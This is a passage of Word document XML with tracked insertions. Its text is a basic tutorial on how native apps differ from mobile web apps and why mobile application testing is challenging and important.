    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="294" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="295" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Native apps are written in platforms like SDKs while Mobile web apps are written with web technologies like HTML, CSS, asp.net, Java, PHP.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="296" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="297" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>For a native app, installation is required but for mobile web apps, no installation is required.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="298" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="299" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>A native app can be updated from play store or app store while mobile web apps are centralized updates.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="300" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="301" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Many native apps don’t require Internet connection but for mobile web apps, it’s a must.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="302" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="303" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Native app works faster when compared to mobile web apps.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="304" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Native apps are installed from app stores like </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://play.google.com/store?hl=en" \o "Google app store" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Google play store</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> or </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.apple.com/osx/apps/app-store.html" \o "App store" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>app store</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> where mobile web are websites and are only accessible through the Internet.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="004A003F">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="305"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06" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="307" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The rest of the article is going to be about Mobile Application Testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="308" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Significance of Mobile Application Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>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369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="309" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="310" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Testing applications on mobile devices is more challenging than testing web apps on desktop due to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="311" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="312" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Different range of mobile devices</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> with different screen sizes and hardware configurations like a hard keypad, virtual keypad (touch screen) and trackball etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="313" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="314" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Wide varieties of mobile devices</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> like HTC, Samsung, Apple and Nokia.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="315" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="316" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Different mobile operating systems</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> like Android, Symbian, Windows, Blackberry and IOS.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="317" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="318" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Different versions of operation system</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> like </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>iOS</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> 5.x, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>iOS</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> 6.x, BB5.x, BB6.x etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="319" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="320" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Different mobile network operators</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> like GSM and CDMA.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="321" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Frequent </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>updates</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> – (like Android- 4.2, 4.3, 4.4, iOS-5.x, 6.x) – with each update a new testing cycle is recommended to make sure no application functionality is impacted.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="322" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="323" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="324" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>As with any application, Mobile application testing is also very important, as the clientele is usually in millions for a certain product – and a product with bugs is never appreciated. It often results in monetary losses, legal issue and irreparable brand image damage.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="325" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="326" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Basic Difference </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Between</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Mobile and Desktop Application Testing:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="327" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="328" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Few obvious aspects that set mobile app testing apart from the desktop testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="329" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="330" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>On the desktop, the application is tested on a central processing unit. On a mobile device, the application is tested on handsets like Samsung, Nokia, Apple and HTC.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="331" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="332" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Mobile device screen size is smaller than desktop.</w:t>
        </w:r>
      </w:ins>
    </w:p>
